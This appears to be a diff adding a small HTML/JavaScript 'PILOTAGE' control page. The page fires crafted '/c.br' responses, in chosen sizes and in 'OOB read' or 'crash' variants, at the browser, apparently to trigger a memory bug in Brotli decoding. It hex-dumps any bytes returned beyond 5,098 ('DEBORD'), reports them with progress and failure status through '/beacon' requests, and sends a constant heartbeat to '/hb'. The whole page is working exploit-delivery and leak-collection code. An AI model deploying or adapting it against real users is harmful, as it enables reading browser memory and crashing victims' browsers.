@@ -1,0 +1,151 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ctl</title>
+<style>
+  body{font:15px/1.4 -apple-system,sans-serif;margin:0;padding:14px;background:#0b0b0d;color:#e8e8ea}
+  h1{font-size:17px;margin:0 0 10px;color:#9cf}
+  .r{display:flex;flex-wrap:wrap;gap:6px;margin:0 0 8px}
+  button{flex:1 1 auto;min-width:64px;padding:10px 6px;border:1px solid #333;border-radius:8px;background:#1a1a20;color:#ddd;font-size:13px}
+  button.on{background:#26456b;border-color:#4a8;color:#fff;font-weight:700}
+  #tir{width:100%;padding:16px;font-size:16px;font-weight:700;background:#1d4a1d;color:#9f9;border-color:#4a8}
+  pre{background:#17171b;padding:8px;border-radius:8px;font:11px/1.45 ui-monospace,monospace;white-space:pre-wrap;max-height:38vh;overflow:auto}
+  .k{background:#17171b;padding:8px;border-radius:8px;font:12px/1.4 ui-monospace,monospace}
+</style>
+<h1>PILOTAGE</h1>
+
+<div class="r" id="tailles">
+  <button data-sz="90k" class="on">90 K</button>
+  <button data-sz="360k">360 K</button>
+  <button data-sz="720k">720 K</button>
+  <button data-sz="1400k">1,4 M</button>
+  <button data-sz="5700k">5,7 M</button>
+  <button data-sz="11500k">11,5 M</button>
+  <button data-sz="23000k">23 M</button>
+  <button data-sz="w20">w20 1,4 M</button>
+  <button data-sz="w22">w22 5,7 M</button>
+</div>
+<div class="r" id="vars">
+  <button data-var="oob" class="on">variante OOB read</button>
+  <button data-var="crash">variante crash</button>
+</div>
+
+<div class="r" id="modes">
+  <button data-mode="" class="on">transport chunked</button>
+  <button data-mode="cl">transport longueur annoncée</button>
+</div>
+
+<div class="r" id="lect">
+  <button data-lect="flux" class="on">lecture en flux</button>
+  <button data-lect="bloc">lecture en un bloc (ArrayBuffer)</button>
+</div>
+
+<button id="tir">TIRER</button>
+<p id="st" class="k">pret — choisis puis tire</p>
+<pre id="lg"></pre>
+
+<script>
+var st = document.getElementById('st'), lg = document.getElementById('lg');
+var sz = '90k', variante = 'oob', beats = 0, mode = '', lect = 'flux';
+setInterval(function () {
+  beats++;
+  fetch('/hb?n=' + beats, { cache: 'no-store' }).catch(function () {});
+}, 400);
+
+document.querySelectorAll('#tailles button').forEach(function (b) {
+  b.onclick = function () {
+    document.querySelectorAll('#tailles button').forEach(function (x) { x.className = ''; });
+    b.className = 'on'; sz = b.dataset.sz;
+  };
+});
+document.querySelectorAll('#vars button').forEach(function (b) {
+  b.onclick = function () {
+    document.querySelectorAll('#vars button').forEach(function (x) { x.className = ''; });
+    b.className = 'on'; variante = b.dataset.var;
+  };
+});
+
+document.querySelectorAll('#modes button').forEach(function (b) {
+  b.onclick = function () {
+    document.querySelectorAll('#modes button').forEach(function (x) { x.className = ''; });
+    b.className = 'on'; mode = b.dataset.mode;
+  };
+});
+document.querySelectorAll('#lect button').forEach(function (b) {
+  b.onclick = function () {
+    document.querySelectorAll('#lect button').forEach(function (x) { x.className = ''; });
+    b.className = 'on'; lect = b.dataset.lect;
+  };
+});
+function ligne(s) { lg.textContent = s + '\n' + lg.textContent; }
+
+document.getElementById('tir').onclick = function () {
+  var t0 = performance.now(), pay = 0;
+  st.textContent = sz + ' / ' + variante + ' : tir en cours…';
+  fetch('/c.br?sz=' + sz + '&var=' + variante + '&mode=' + mode + '&r=' + Math.random(), { cache: 'no-store' })
+    .then(function (r) {
+      ligne('[' + sz + '/' + variante + '] status ' + r.status);
+      if (lect === 'bloc') {
+        return r.arrayBuffer().then(function (buf) {
+          var ms = Math.round(performance.now() - t0);
+          pay = buf.byteLength;
+          st.textContent = sz + ' : FINI ' + pay + ' o (bloc)';
+          ligne('[' + sz + '/' + variante + '] FINI ' + pay + ' o en ' + ms + ' ms (bloc)');
+          fetch('/beacon?k=FINI&v=' + sz + '_bloc_' + pay, { cache: 'no-store' }).catch(function () {});
+          var db = pay > 5098 ? pay - 5098 : 0;
+          if (db > 0) {
+            var u = new Uint8Array(buf, Math.max(0, pay - db), db), h = '';
+            for (var i = 0; i < u.length; i++) h += ('0' + u[i].toString(16)).slice(-2);
+            ligne('  DEBORD ' + db + ' o : ' + h.slice(0, 120));
+            fetch('/beacon?k=bytes&v=' + sz + '_bloc_' + h.slice(0, 900), { cache: 'no-store' }).catch(function () {});
+          }
+        });
+      }
+      var rd = r.body.getReader();
+      var dernier = 0, queue = new Uint8Array(1024), qlen = 0;
+      function garde(v) {
+        // conserve les 1 024 derniers octets
+        if (v.length >= queue.length) { queue = v.slice(v.length - queue.length); qlen = queue.length; return; }
+        if (qlen + v.length > queue.length) {
+          var debord = qlen + v.length - queue.length;
+          queue.copyWithin(0, debord, qlen);
+          qlen -= debord;
+        }
+        queue.set(v, qlen); qlen += v.length;
+      }
+      function pompe() {
+        return rd.read().then(function (o) {
+          if (o.done) {
+            var ms = Math.round(performance.now() - t0);
+            st.textContent = sz + ' : FINI ' + pay + ' o en ' + ms + ' ms';
+            ligne('[' + sz + '/' + variante + '] FINI ' + pay + ' o en ' + ms + ' ms');
+            fetch('/beacon?k=FINI&v=' + sz + '_' + pay, { cache: 'no-store' }).catch(function () {});
+            var debord = pay > 5098 ? pay - 5098 : 0;
+            if (debord > 0) {
+              var h = '', base = qlen - Math.min(debord, qlen);
+              for (var i = base; i < qlen; i++) h += ('0' + queue[i].toString(16)).slice(-2);
+              ligne('  DEBORD ' + debord + ' o : ' + h.slice(0, 160));
+              fetch('/beacon?k=bytes&v=' + sz + '_' + h.slice(0, 900), { cache: 'no-store' }).catch(function () {});
+            }
+            return;
+          }
+          pay += o.value.length;
+          garde(o.value);
+          if (pay - dernier >= 65536) {
+            dernier = pay;
+            fetch('/beacon?k=prog&v=' + sz + '_' + pay, { cache: 'no-store' }).catch(function () {});
+            st.textContent = sz + ' : ' + pay + ' o …';
+          }
+          return pompe();
+        });
+      }
+      return pompe();
+    })
+    .catch(function (e) {
+      var ms = Math.round(performance.now() - t0);
+      st.textContent = sz + ' : ECHEC ' + e.name + ' apres ' + pay + ' o';
+      ligne('[' + sz + '/' + variante + '] ECHEC ' + e.name + ' apres ' + pay + ' o (' + ms + ' ms)');
+      fetch('/beacon?k=ECHEC&v=' + sz + '_' + e.name + '_' + pay, { cache: 'no-store' }).catch(function () {});
+    });
+};
+</script>
